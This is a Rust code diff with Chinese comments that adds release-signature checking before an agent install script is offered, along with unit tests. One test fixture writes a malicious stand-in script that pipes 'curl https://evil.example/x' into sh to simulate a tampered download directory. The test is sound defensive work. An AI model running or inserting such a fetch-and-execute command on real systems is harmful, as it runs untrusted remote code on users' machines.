@@ -8,6 +8,11 @@
 //!   **腳本本身不在這個保證之內**——驗證的邏輯就在被下載的腳本裡。所以主控台的一行安裝指令帶著腳本的
 //!   SHA-256（[`Status::install_script_sha256`]，經主控台的 HTTPS 取得），目標主機在執行之前先比對；
 //!   這把對腳本的信任放在主控台與 `enroll.download_dir` 的內容上，後者只應由管理者可寫。
+//! - **下載目錄的簽章（安全稽核 C3 加強）**：設定了 `[remote] allowed_signers` 時，Kairos 先以它驗證目錄的
+//!   `SHA256SUMS.sig`（與匯入版本庫相同的 [`kairos_proto::release::verify_bundle`]），並要求**簽章涵蓋的**
+//!   `SHA256SUMS` 列出 `pulse-install.sh` 且雜湊相符，通過才提供一行安裝指令（[`SignerTrust`]）。只能改寫下載
+//!   目錄的人沒有發佈私鑰，換掉腳本並同步改掉 `SHA256SUMS` 也過不了。沒有設定 `allowed_signers` 時維持
+//!   0.12.0 的行為（不驗證簽章），`downloads.signature` 為 `not_checked` 並附警語。
 //! - **路徑**：檔名只能是 1～128 個英數字與 `. _ -`、不以 `.` 開頭（[`kairos_proto::enroll::parse_route`]，
 //!   沒有 `/`、`..`、百分比編碼）；只提供目錄中**一般檔案**（不跟隨符號連結、不進入子目錄），大小上限 1 GiB。
 //! - **內容類型**依副檔名（[`content_type`]），一律 `X-Content-Type-Options: nosniff` 與
@@ -30,7 +35,11 @@ use std::sync::{Arc, Mutex};
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tokio::io::AsyncReadExt;
 
+use kairos_proto::mgmt::{MAX_SHA256SUMS_BYTES, MAX_SIGNATURE_BYTES};
+use kairos_proto::release::{self, ReleaseBundle, ReleaseError, TrustPolicy};
+
 use crate::api::http::ApiBody;
+use crate::remote::releases::Trust;
 
 /// 下載可用時必須存在的檔案（`pulse-install.sh --base-url` 先取這兩個驗證簽章）
 pub const REQUIRED: [&str; 3] = [SCRIPT, "SHA256SUMS", "SHA256SUMS.sig"];
@@ -49,6 +58,49 @@ pub const CODE_INCOMPLETE: &str = "KRS-W2012";
 /// 三個檔案都在，但安裝腳本沒有通過檢查（與同目錄 `SHA256SUMS` 記錄的雜湊不符、不是一般檔案、超過大小上限
 /// 或讀不到）的代碼。**工程暫定號**（0.12.0 與缺檔共用 `KRS-W2012`；正式分配由設計包定案）
 pub const CODE_SCRIPT_MISMATCH: &str = "KRS-W2013";
+/// 設定了 `[remote] allowed_signers`，但下載目錄的 `SHA256SUMS.sig` 沒有通過驗證（簽章不符、簽署金鑰不被信任
+/// 或已過期、簽章涵蓋的 `SHA256SUMS` 沒有列出安裝腳本或雜湊不符，或 `allowed_signers` 本身無法使用）的代碼。
+/// **工程暫定號**（正式分配由設計包定案）
+pub const CODE_SIGNATURE_UNVERIFIED: &str = "KRS-W2014";
+
+/// 驗證下載目錄的簽章所用的信任設定（`[remote] allowed_signers`；安全稽核 C3 加強）
+#[derive(Debug, Clone)]
+pub enum SignerTrust {
+    /// 沒有設定：不驗證簽章（0.12.0 的行為），狀態附警語
+    NotConfigured,
+    /// 設定了但無法使用（讀不到、沒有可用的金鑰）：無法驗證，不提供一行安裝指令
+    Unavailable(String),
+    /// 以這份信任設定驗證
+    Configured(Trust),
+}
+
+/// 下載目錄簽章的檢查結果（API 的 `downloads.signature`）
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum SignatureState {
+    /// 沒有檢查：沒有設定 `allowed_signers`，或目錄在檢查簽章之前就不可用（`not_checked`）
+    NotChecked,
+    /// 通過（`verified`）：符合的 principal 與簽署金鑰的指紋
+    Verified {
+        principal: String,
+        fingerprint: String,
+    },
+    /// 沒有通過（`failed`）
+    Failed,
+}
+
+impl SignatureState {
+    /// API 的值
+    pub fn as_str(&self) -> &'static str {
+        match self {
+            SignatureState::NotChecked => "not_checked",
+            SignatureState::Verified { .. } => "verified",
+            SignatureState::Failed => "failed",
+        }
+    }
+}
+
+/// 沒有設定 `[remote] allowed_signers` 時的警語（啟動日誌與 API 的 `downloads.warning`）
+pub const WARNING_SIGNATURE_NOT_CHECKED: &str = "沒有設定 [remote] allowed_signers：Kairos 沒有驗證下載目錄的 SHA256SUMS.sig，一行安裝指令只依賴下載目錄的內容；設定後 Kairos 會先以發佈公鑰驗證簽章，通過才提供指令";
 
 /// 副檔名 → `Content-Type`
 pub fn content_type(name: &str) -> &'static str {
@@ -136,26 +188,43 @@ pub struct Status {
     pub available: bool,
     /// 不可用的原因（給管理者）
     pub reason: Option<String>,
-    /// 設定了目錄卻不可用時的產品代碼（[`CODE_INCOMPLETE`]、[`CODE_SCRIPT_MISMATCH`]）；沒有設定目錄或可用時 `None`
+    /// 設定了目錄卻不可用時的產品代碼（[`CODE_INCOMPLETE`]、[`CODE_SCRIPT_MISMATCH`]、
+    /// [`CODE_SIGNATURE_UNVERIFIED`]）；沒有設定目錄或可用時 `None`
     pub code: Option<&'static str>,
     /// 目錄中可下載的檔案（依名稱排序）
     pub files: Vec<String>,
     /// `pulse-install.sh` 的 SHA-256（可用時才有）
     pub install_script_sha256: Option<String>,
+    /// 下載目錄簽章的檢查結果
+    pub signature: SignatureState,
+    /// 可用但需要提醒管理者的事（沒有設定 `allowed_signers`）
+    pub warning: Option<String>,
 }
 
-/// 檢查下載目錄（`dir` 為空：未設定）
-pub fn status(dir: Option<&Path>) -> Status {
-    let Some(dir) = dir else {
-        return Status {
+impl Status {
+    /// 不可用的狀態
+    fn unavailable(reason: String, code: Option<&'static str>, files: Vec<String>) -> Self {
+        Status {
             available: false,
-            reason: Some(
-                "沒有設定 enroll.download_dir（下載端點未啟用，/agent/ 回 404）".to_string(),
-            ),
-            code: None,
-            files: Vec::new(),
+            reason: Some(reason),
+            code,
+            files,
             install_script_sha256: None,
-        };
+            signature: SignatureState::NotChecked,
+            warning: None,
+        }
+    }
+}
+
+/// 檢查下載目錄（`dir` 為空：未設定）。`trust` 為 `[remote] allowed_signers`，`now_unix` 用於判斷簽署金鑰的
+/// `valid-after`／`valid-before`
+pub fn status(dir: Option<&Path>, trust: &SignerTrust, now_unix: i64) -> Status {
+    let Some(dir) = dir else {
+        return Status::unavailable(
+            "沒有設定 enroll.download_dir（下載端點未啟用，/agent/ 回 404）".to_string(),
+            None,
+            Vec::new(),
+        );
     };
     let mut files: Vec<String> = match std::fs::read_dir(dir) {
         Ok(rd) => rd
@@ -165,16 +234,11 @@ pub fn status(dir: Option<&Path>) -> Status {
             .filter(|n| kairos_proto::enroll::parse_route("GET", &format!("/agent/{n}")).is_ok())
             .collect(),
         Err(e) => {
-            return Status {
-                available: false,
-                reason: Some(format!(
-                    "無法讀取 enroll.download_dir（{}）：{e}",
-                    dir.display()
-                )),
-                code: Some(CODE_INCOMPLETE),
-                files: Vec::new(),
-                install_script_sha256: None,
-            };
+            return Status::unavailable(
+                format!("無法讀取 enroll.download_dir（{}）：{e}", dir.display()),
+                Some(CODE_INCOMPLETE),
+                Vec::new(),
+            );
         }
     };
     files.sort();
@@ -184,34 +248,113 @@ pub fn status(dir: Option<&Path>) -> Status {
         .filter(|r| !files.iter().any(|f| f == r))
         .collect();
     if !missing.is_empty() {
-        return Status {
-            available: false,
-            reason: Some(format!(
+        return Status::unavailable(
+            format!(
                 "enroll.download_dir（{}）缺少 {}：請放入同一個發佈版本的 pulse-install.sh、SHA256SUMS、SHA256SUMS.sig 與套件",
                 dir.display(),
                 missing.join("、")
-            )),
-            code: Some(CODE_INCOMPLETE),
+            ),
+            Some(CODE_INCOMPLETE),
             files,
-            install_script_sha256: None,
-        };
+        );
     }
-    match install_script_sha256(dir) {
-        Ok(hash) => Status {
-            available: true,
-            reason: None,
-            code: None,
-            files,
-            install_script_sha256: Some(hash),
+    let hash = match install_script_sha256(dir) {
+        Ok(hash) => hash,
+        Err(why) => {
+            return Status::unavailable(
+                format!("enroll.download_dir（{}）：{why}", dir.display()),
+                Some(CODE_SCRIPT_MISMATCH),
+                files,
+            );
+        }
+    };
+    // 安全稽核 C3 加強：設定了 allowed_signers 時，簽章通過才提供一行安裝指令
+    let unverified = |why: String| Status {
+        signature: SignatureState::Failed,
+        ..Status::unavailable(
+            format!(
+                "enroll.download_dir（{}）：{why}；沒有通過驗證之前不提供一行安裝指令",
+                dir.display()
+            ),
+            Some(CODE_SIGNATURE_UNVERIFIED),
+            files.clone(),
+        )
+    };
+    let (signature, warning) = match trust {
+        SignerTrust::NotConfigured => (
+            SignatureState::NotChecked,
+            Some(WARNING_SIGNATURE_NOT_CHECKED.to_string()),
+        ),
+        SignerTrust::Unavailable(e) => {
+            return unverified(format!(
+                "[remote] allowed_signers 無法使用（{e}），無法驗證 SHA256SUMS.sig"
+            ));
+        }
+        SignerTrust::Configured(t) => match verify_signature(dir, &hash, t, now_unix) {
+            Ok(state) => (state, None),
+            Err(why) => return unverified(why),
         },
-        Err(why) => Status {
-            available: false,
-            reason: Some(format!("enroll.download_dir（{}）：{why}", dir.display())),
-            code: Some(CODE_SCRIPT_MISMATCH),
-            files,
-            install_script_sha256: None,
-        },
+    };
+    Status {
+        available: true,
+        reason: None,
+        code: None,
+        files,
+        install_script_sha256: Some(hash),
+        signature,
+        warning,
     }
+}
+
+/// 讀取下載目錄中的一個文字檔（一般檔案、不超過 `max` bytes、UTF-8）
+fn read_small_text(dir: &Path, name: &str, max: usize) -> Result<String, String> {
+    let path = dir.join(name);
+    let meta = std::fs::symlink_metadata(&path).map_err(|e| format!("無法讀取 {name}：{e}"))?;
+    if !meta.file_type().is_file() {
+        return Err(format!("{name} 不是一般檔案"));
+    }
+    if meta.len() > max as u64 {
+        return Err(format!("{name} 超過 {max} bytes"));
+    }
+    std::fs::read_to_string(&path).map_err(|e| format!("無法讀取 {name}：{e}"))
+}
+
+/// 以 `[remote] allowed_signers` 驗證下載目錄的 `SHA256SUMS.sig`（與匯入版本庫相同的驗證），再以**簽章涵蓋的**
+/// `SHA256SUMS` 確認安裝腳本（`script_sha256` 是剛才算出、之後放進指令的雜湊）：必須列在其中而且相符——沒有
+/// 列出時簽章對腳本沒有任何保證，一樣不通過
+fn verify_signature(
+    dir: &Path,
+    script_sha256: &str,
+    trust: &Trust,
+    now_unix: i64,
+) -> Result<SignatureState, String> {
+    let sums = read_small_text(dir, "SHA256SUMS", MAX_SHA256SUMS_BYTES)?;
+    let sig = read_small_text(dir, "SHA256SUMS.sig", MAX_SIGNATURE_BYTES)?;
+    let verified = release::verify_bundle(
+        &ReleaseBundle {
+            sha256sums: &sums,
+            signature: &sig,
+            manifest: None,
+        },
+        &TrustPolicy {
+            signers: &trust.signers,
+            extra_principals: &trust.extra_principals,
+            now_unix,
+        },
+    )
+    .map_err(|e| match e {
+        ReleaseError::Signature(s) => format!(
+            "SHA256SUMS.sig 沒有通過 [remote] allowed_signers 的驗證（{s}）：請放入官方發佈包原本的 SHA256SUMS 與 SHA256SUMS.sig，或確認 allowed_signers 列出了簽署這次發佈的公鑰"
+        ),
+        ReleaseError::Integrity(s) => format!("SHA256SUMS 的格式不正確（{s}）"),
+    })?;
+    verified.sums.check(SCRIPT, script_sha256).map_err(|e| {
+        format!("簽章涵蓋的 SHA256SUMS 無法確認 {SCRIPT}（{e}）：請放入同一個發佈版本的 {SCRIPT}")
+    })?;
+    Ok(SignatureState::Verified {
+        principal: verified.signer.principal,
+        fingerprint: verified.signer.fingerprint,
+    })
 }
 
 /// `pulse-install.sh` 的 SHA-256（小寫十六進位）。主控台把它放進一行安裝指令，目標主機在執行腳本之前先比對
@@ -245,12 +388,27 @@ fn install_script_sha256(dir: &Path) -> Result<String, String> {
 }
 
 /// 主控台 API 的 `downloads`（`GET /api/v1/enroll/mode` 等；設計包 INTEGRATION §27.4 #3）
-pub fn status_json(dir: Option<&Path>, base_url: &str) -> Value {
-    let s = status(dir);
+pub fn status_json(
+    dir: Option<&Path>,
+    trust: &SignerTrust,
+    now_unix: i64,
+    base_url: &str,
+) -> Value {
+    let s = status(dir, trust, now_unix);
+    let signer = match &s.signature {
+        SignatureState::Verified {
+            principal,
+            fingerprint,
+        } => json!({"principal": principal, "fingerprint": fingerprint}),
+        _ => Value::Null,
+    };
     json!({
         "available": s.available,
         "reason": s.reason,
         "product_code": s.code,
+        "signature": s.signature.as_str(),
+        "signer": signer,
+        "warning": s.warning,
         "base_url": s.available.then(|| base_url.to_string()),
         "install_script": s.available.then(|| format!("{base_url}/{SCRIPT}")),
         "install_script_sha256": s.install_script_sha256,
@@ -363,6 +521,221 @@ pub async fn respond(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::remote::test_sign::TestSigner;
+    use kairos_proto::release::AllowedSigners;
+
+    /// 沒有設定 `[remote] allowed_signers`（0.12.0 的行為）
+    const NO_TRUST: SignerTrust = SignerTrust::NotConfigured;
+    /// 測試用的現在時間（2026-11-16）
+    const NOW: i64 = 1_794_787_200;
+    const URL: &str = "https://k:8444/agent";
+
+    fn trust_of(allowed_signers: &str) -> SignerTrust {
+        SignerTrust::Configured(Trust {
+            signers: AllowedSigners::parse(allowed_signers),
+            extra_principals: Vec::new(),
+        })
+    }
+
+    /// 一個完整的下載目錄：安裝腳本、列出它的 `SHA256SUMS`、`signer` 的簽章。回傳（目錄、腳本的雜湊）
+    fn signed_dir(tag: &str, signer: &TestSigner) -> (PathBuf, String) {
+        let d = dir(tag);
+        let script = "#!/bin/sh\necho official\n";
+        let hash = kairos_proto::enroll::sha256_hex(script.as_bytes());
+        let sums = format!(
+            "{}  pulse_0.12.0_amd64.deb\n{hash}  pulse-install.sh\n",
+            "1".repeat(64)
+        );
+        std::fs::write(d.join("pulse-install.sh"), script).unwrap();
+        std::fs::write(d.join("SHA256SUMS"), &sums).unwrap();
+        std::fs::write(d.join("SHA256SUMS.sig"), signer.sign(sums.as_bytes())).unwrap();
+        (d, hash)
+    }
+
+    /// 不提供一行安裝指令：API 沒有 `base_url`、`install_script`、`install_script_sha256`（主控台靠這三個欄位組出指令）
+    fn assert_no_one_liner(v: &Value) {
+        assert_eq!(v["available"], false, "{v}");
+        assert!(v["base_url"].is_null(), "{v}");
+        assert!(v["install_script"].is_null(), "{v}");
+        assert!(v["install_script_sha256"].is_null(), "{v}");
+        assert!(v["reason"].as_str().is_some_and(|r| !r.is_empty()), "{v}");
+    }
+
+    // 安全稽核 C3 加強：設定了 allowed_signers，簽章通過才提供一行安裝指令
+    #[test]
+    fn with_allowed_signers_a_verified_signature_enables_the_one_liner() {
+        let signer = TestSigner::new(7);
+        let (d, hash) = signed_dir("sig-ok", &signer);
+        let trust = trust_of(&signer.allowed_signers());
+        let s = status(Some(&d), &trust, NOW);
+        assert!(s.available, "{s:?}");
+        assert_eq!(s.code, None);
+        assert_eq!(s.warning, None, "已驗證時沒有警語");
+        let SignatureState::Verified {
+            principal,
+            fingerprint,
+        } = &s.signature
+        else {
+            panic!("{s:?}");
+        };
+        assert_eq!(principal, "release@kairos-pulse");
+        assert!(fingerprint.starts_with("SHA256:"), "{fingerprint}");
+        let v = status_json(Some(&d), &trust, NOW, URL);
+        assert_eq!(v["available"], true);
+        assert_eq!(v["signature"], "verified");
+        assert_eq!(v["signer"]["fingerprint"], fingerprint.as_str());
+        assert_eq!(v["install_script_sha256"], hash.as_str());
+        assert_eq!(v["base_url"], URL);
+        assert!(v["product_code"].is_null() && v["warning"].is_null());
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    // 稽核 C3 的情境：只能改寫下載目錄的人換掉安裝腳本，並把 SHA256SUMS 改成一致。0.12.0 的檢查（腳本與同目錄
+    // SHA256SUMS 相符）擋不住；設定了 allowed_signers 之後簽章不符，不提供指令
+    #[test]
+    fn a_replaced_script_with_a_rewritten_sha256sums_fails_the_signature_check() {
+        let signer = TestSigner::new(7);
+        let (d, _) = signed_dir("sig-rewritten", &signer);
+        let evil = "#!/bin/sh\ncurl https://evil.example/x | sh\n";
+        let evil_hash = kairos_proto::enroll::sha256_hex(evil.as_bytes());
+        std::fs::write(d.join("pulse-install.sh"), evil).unwrap();
+        std::fs::write(
+            d.join("SHA256SUMS"),
+            format!(
+                "{}  pulse_0.12.0_amd64.deb\n{evil_hash}  pulse-install.sh\n",
+                "1".repeat(64)
+            ),
+        )
+        .unwrap();
+        // 沒有設定 allowed_signers：與 0.12.0 相同，這個目錄看起來是一致的（所以才需要簽章）
+        let legacy = status(Some(&d), &NO_TRUST, NOW);
+        assert!(legacy.available, "{legacy:?}");
+        assert_eq!(legacy.signature, SignatureState::NotChecked);
+        // 設定了：不提供
+        let trust = trust_of(&signer.allowed_signers());
+        let s = status(Some(&d), &trust, NOW);
+        assert!(!s.available, "{s:?}");
+        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
+        assert_eq!(s.signature, SignatureState::Failed);
+        assert_eq!(s.install_script_sha256, None);
+        let v = status_json(Some(&d), &trust, NOW, URL);
+        assert_no_one_liner(&v);
+        assert_eq!(v["product_code"], "KRS-W2014");
+        assert_eq!(v["signature"], "failed");
+        assert!(v["signer"].is_null());
+        assert!(
+            v["reason"]
+                .as_str()
+                .unwrap()
+                .contains("SHA256SUMS.sig 沒有通過"),
+            "{v}"
+        );
+        // 攻擊者連簽章一起換成自己的金鑰簽的：金鑰不在 allowed_signers
+        let attacker = TestSigner::new(9);
+        let sums = std::fs::read(d.join("SHA256SUMS")).unwrap();
+        std::fs::write(d.join("SHA256SUMS.sig"), attacker.sign(&sums)).unwrap();
+        let v = status_json(Some(&d), &trust, NOW, URL);
+        assert_no_one_liner(&v);
+        assert_eq!(v["product_code"], "KRS-W2014");
+        // 簽章不是 SSHSIG
+        std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
+        let v = status_json(Some(&d), &trust, NOW, URL);
+        assert_no_one_liner(&v);
+        assert_eq!(v["product_code"], "KRS-W2014");
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    // 簽章只保護 SHA256SUMS 列出的檔案：沒有列出安裝腳本時，簽章對腳本沒有任何保證
+    #[test]
+    fn a_verified_signature_must_cover_the_install_script() {
+        let signer = TestSigner::new(7);
+        let d = dir("sig-unlisted");
+        let sums = format!("{}  pulse_0.12.0_amd64.deb\n", "1".repeat(64));
+        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho anything\n").unwrap();
+        std::fs::write(d.join("SHA256SUMS"), &sums).unwrap();
+        std::fs::write(d.join("SHA256SUMS.sig"), signer.sign(sums.as_bytes())).unwrap();
+        // 沒有設定 allowed_signers：維持 0.12.0（沒有列出時不比對）
+        assert!(status(Some(&d), &NO_TRUST, NOW).available);
+        let trust = trust_of(&signer.allowed_signers());
+        let s = status(Some(&d), &trust, NOW);
+        assert!(!s.available, "{s:?}");
+        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
+        assert!(
+            s.reason
+                .as_ref()
+                .unwrap()
+                .contains("無法確認 pulse-install.sh"),
+            "{s:?}"
+        );
+        assert_no_one_liner(&status_json(Some(&d), &trust, NOW, URL));
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    // 簽署金鑰過期（valid-before 已過）、allowed_signers 無法使用：都不提供，原因各自說明
+    #[test]
+    fn an_expired_signer_or_an_unusable_trust_anchor_disables_the_one_liner() {
+        let signer = TestSigner::new(7);
+        let (d, _) = signed_dir("sig-expired", &signer);
+        let line = signer.allowed_signers();
+        let expired = line.replacen(
+            "namespaces=\"kairos-pulse-release\"",
+            "namespaces=\"kairos-pulse-release\",valid-before=\"20200101\"",
+            1,
+        );
+        assert_ne!(expired, line);
+        let s = status(Some(&d), &trust_of(&expired), NOW);
+        assert!(!s.available, "{s:?}");
+        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
+        assert!(s.reason.as_ref().unwrap().contains("expired"), "{s:?}");
+        // 同一行沒有期限時通過（確認上面失敗的原因是期限）
+        assert!(status(Some(&d), &trust_of(&line), NOW).available);
+        // allowed_signers 設定了但讀不到：無法驗證，不能當成沒有設定
+        let broken = SignerTrust::Unavailable("/etc/kairos/allowed_signers：No such file".into());
+        let s = status(Some(&d), &broken, NOW);
+        assert!(!s.available, "{s:?}");
+        assert_eq!(s.code, Some(CODE_SIGNATURE_UNVERIFIED));
+        assert_eq!(s.signature, SignatureState::Failed);
+        assert!(
+            s.reason
+                .as_ref()
+                .unwrap()
+                .contains("allowed_signers 無法使用"),
+            "{s:?}"
+        );
+        assert_no_one_liner(&status_json(Some(&d), &broken, NOW, URL));
+        let _ = std::fs::remove_dir_all(&d);
+    }
+
+    // 預設行為不變：沒有設定 allowed_signers 的既有部署照常提供一行安裝指令（簽章檔的內容不檢查），只多警語
+    #[test]
+    fn without_allowed_signers_the_existing_behaviour_is_kept_with_a_warning() {
+        let d = dir("sig-legacy");
+        let script = "#!/bin/sh\n";
+        let hash = kairos_proto::enroll::sha256_hex(script.as_bytes());
+        std::fs::write(d.join("pulse-install.sh"), script).unwrap();
+        std::fs::write(d.join("SHA256SUMS"), format!("{hash}  pulse-install.sh\n")).unwrap();
+        std::fs::write(d.join("SHA256SUMS.sig"), "not a signature").unwrap();
+        let v = status_json(Some(&d), &NO_TRUST, NOW, URL);
+        assert_eq!(v["available"], true, "{v}");
+        assert_eq!(v["install_script_sha256"], hash.as_str());
+        assert_eq!(v["base_url"], URL);
+        assert_eq!(v["signature"], "not_checked");
+        assert!(v["signer"].is_null() && v["product_code"].is_null());
+        assert!(
+            v["warning"].as_str().unwrap().contains("allowed_signers"),
+            "{v}"
+        );
+        // 簽章以前的檢查先做：缺檔、腳本不符時代碼不變，也不附「沒有驗證簽章」的警語
+        std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho changed\n").unwrap();
+        let signer = TestSigner::new(7);
+        for trust in [NO_TRUST, trust_of(&signer.allowed_signers())] {
+            let v = status_json(Some(&d), &trust, NOW, URL);
+            assert_eq!(v["product_code"], "KRS-W2013", "{v}");
+            assert_eq!(v["signature"], "not_checked");
+            assert!(v["warning"].is_null());
+        }
+        let _ = std::fs::remove_dir_all(&d);
+    }
 
     fn dir(tag: &str) -> PathBuf {
         let d = std::env::temp_dir().join(format!(
@@ -402,15 +775,17 @@ mod tests {
 
     #[test]
     fn status_requires_the_signed_checksums_and_the_script() {
-        let s = status(None);
+        let s = status(None, &NO_TRUST, NOW);
         assert_eq!(s.code, None, "沒有設定下載目錄不是警告");
         assert!(!s.available && s.reason.unwrap().contains("enroll.download_dir"));
-        assert!(status_json(None, "https://k:8444/agent")["product_code"].is_null());
+        assert!(
+            status_json(None, &NO_TRUST, NOW, "https://k:8444/agent")["product_code"].is_null()
+        );
         let d = dir("status");
         std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\n").unwrap();
         std::fs::write(d.join(".hidden"), "x").unwrap();
         std::fs::create_dir_all(d.join("sub")).unwrap();
-        let s = status(Some(&d));
+        let s = status(Some(&d), &NO_TRUST, NOW);
         assert!(!s.available);
         assert!(
             s.reason
@@ -423,7 +798,7 @@ mod tests {
         // 缺檔是 KRS-W2012
         assert_eq!(s.code, Some(CODE_INCOMPLETE));
         assert_eq!(
-            status_json(Some(&d), "https://k:8444/agent")["product_code"],
+            status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent")["product_code"],
             "KRS-W2012"
         );
         let hash = kairos_proto::enroll::sha256_hex(b"#!/bin/sh\n");
@@ -436,7 +811,7 @@ mod tests {
         )
         .unwrap();
         std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
-        let v = status_json(Some(&d), "https://k:8444/agent");
+        let v = status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent");
         assert_eq!(v["available"], true);
         assert_eq!(v["install_script"], "https://k:8444/agent/pulse-install.sh");
         assert_eq!(v["files"].as_array().unwrap().len(), 3);
@@ -454,21 +829,24 @@ mod tests {
         std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho ok\n").unwrap();
         std::fs::write(d.join("SHA256SUMS"), format!("{hash} *pulse-install.sh\n")).unwrap();
         std::fs::write(d.join("SHA256SUMS.sig"), "sig").unwrap();
-        assert_eq!(status(Some(&d)).install_script_sha256, Some(hash));
+        assert_eq!(
+            status(Some(&d), &NO_TRUST, NOW).install_script_sha256,
+            Some(hash)
+        );
         // 腳本被換掉
         std::fs::write(d.join("pulse-install.sh"), "#!/bin/sh\necho changed\n").unwrap();
-        let s = status(Some(&d));
+        let s = status(Some(&d), &NO_TRUST, NOW);
         assert!(!s.available, "{s:?}");
         assert!(s.reason.as_ref().unwrap().contains("SHA256SUMS"), "{s:?}");
         // 「不相符」有自己的代碼，不再與缺檔共用 KRS-W2012
         assert_eq!(s.code, Some(CODE_SCRIPT_MISMATCH));
-        let v = status_json(Some(&d), "https://k:8444/agent");
+        let v = status_json(Some(&d), &NO_TRUST, NOW, "https://k:8444/agent");
         assert_eq!(v["available"], false);
         assert_eq!(v["product_code"], "KRS-W2013");
         assert!(v["base_url"].is_null() && v["install_script_sha256"].is_null());
         // SHA256SUMS 沒有列出腳本（舊的發佈包）：以實際內容的雜湊為準
         std::fs::write(d.join("SHA256SUMS"), "x  other\n").unwrap();
-        let s = status(Some(&d));
+        let s = status(Some(&d), &NO_TRUST, NOW);
         assert!(s.available);
         assert_eq!(
             s.install_script_sha256,
@@ -482,7 +860,7 @@ mod tests {
             std::fs::remove_file(d.join("pulse-install.sh")).unwrap();
             std::fs::write(d.join("real.sh"), "#!/bin/sh\n").unwrap();
             std::os::unix::fs::symlink(d.join("real.sh"), d.join("pulse-install.sh")).unwrap();
-            let s = status(Some(&d));
+            let s = status(Some(&d), &NO_TRUST, NOW);
             assert!(!s.available);
             // 符號連結不算目錄中的檔案：歸在缺檔
             assert_eq!(s.code, Some(CODE_INCOMPLETE), "{s:?}");
